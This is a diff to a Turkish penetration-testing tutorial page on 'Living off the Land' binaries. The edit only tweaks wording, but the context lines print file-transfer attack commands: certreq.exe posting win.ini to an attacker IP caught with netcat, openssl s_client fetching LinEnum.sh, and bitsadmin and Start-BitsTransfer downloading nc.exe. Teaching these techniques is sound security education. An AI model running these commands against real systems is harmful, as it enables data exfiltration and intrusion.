@@ -4,7 +4,7 @@ icon: material/circle-small
 
 # Living off The Land
 
-LOLBins (Living Off The Land Binaries) terimi, bir saldırganın orijinal amacının ötesinde eylemler gerçekleştirmek için kullanabileceği ikili dosyaları ifade etmek için kullanılır. Şu anda LOLBins hakkında bilgi toplayan iki web sitesi bulunmaktadır:
+LOLBins (Living Off The Land Binaries) terimi, bir saldırganın, orijinal amacının ötesinde eylemler gerçekleştirmek için kullanabileceği ikili dosyaları ifade etmek için kullanılır. Aşağıda verilen siteler bahsedilen ikili dosyalar hakkında bilgi toplamaktadır:
 
 1. [LOLBAS](https://lolbas-project.github.io)
 2. [GTFOBins](https://gtfobins.github.io/)
@@ -13,7 +13,7 @@ LOLBins (Living Off The Land Binaries) terimi, bir saldırganın orijinal amacı
 
 ### LOLBAS
 
-LOLBAS (Living Off The Land Binaries, Scripts and Libraries) sitesinde indirme ve yükleme işlevlerini aramak için `/download` veya `/upload` filtrelerini kullanabiliriz.
+LOLBAS (Living Off The Land Binaries, Scripts and Libraries) sitesinde indirme ve yükleme işlevlerini aramak için `/download` ve `/upload` filtrelerini kullanabiliriz.
 
 Örnek olarak [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) aracını ele alalım. Netcat aracını kullanarak gelen trafiği, saldırı makinemizdeki bir port üzerinden dinlememiz ve ardından bir dosya yüklemek için `CertReq.exe` aracını çalıştırmamız gerekiyor:
 
@@ -21,7 +21,7 @@ LOLBAS (Living Off The Land Binaries, Scripts and Libraries) sitesinde indirme v
 certreq.exe -Post -config http://192.168.49.128 c:\windows\win.ini
 ```
 
-Bu, dosyayı Netcat oturumumuza gönderecektir:
+Bu işlem, dosyayı Netcat oturumumuza gönderecektir:
 
 ```bash
 sudo nc -lvnp 80
@@ -52,7 +52,7 @@ Eğer `CertReq.exe` aracını çalıştırırken hata alırsanız kullandığın
 
 ### GTFOBins
 
-LOLBAS sitesinde indirme ve yükleme işlevlerini aramak için `+file download` veya `+file upload` filtrelerini kullanabiliriz.
+LOLBAS sitesinde indirme ve yükleme işlevlerini aramak için `+file download` ve `+file upload` filtrelerini kullanabiliriz.
 
 Örnek olarak [OpenSSL](https://www.openssl.org/) aracını ele alalım. Öncelikle bir sertifika oluşturmamız gerekiyor:
 
@@ -76,13 +76,13 @@ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 
 ### Bitsadmin Download function
 
-BITS ([Background Intelligent Transfer Service](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)), HTTP sitelerinden ve SMB paylaşımlarından dosya indirmek için kullanılabilir. Kullanıcının ön plandaki çalışması üzerindeki etkiyi en aza indirmek için bilgisayar ve ağ kullanımını akıllıca kontrol eder:
+BITS ([Background Intelligent Transfer Service](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)), HTTP sitelerinden ve SMB paylaşımlarından dosya indirmek için kullanılabilir. Bu servis, kullanıcının ön plandaki çalışması üzerindeki etkiyi en aza indirmek için bilgisayar ve ağ kullanımını akıllıca kontrol eder:
 
 ```batch
 bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
 ```
 
-PowerShell, BITS ile etkileşime olanak tanır, dosya indirme ve yükleme işlemlerine olanak tanır, kimlik bilgilerini destekler ve belirtilen proxy sunucularını kullanabilir:
+PowerShell, BITS ile etkileşime olanak tanır, dosya indirme ve yükleme işlemleri gerçekleştirebilir, kimlik bilgilerini destekler ve belirtilen proxy sunucularını kullanabilir:
 
 ```powershell
 Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
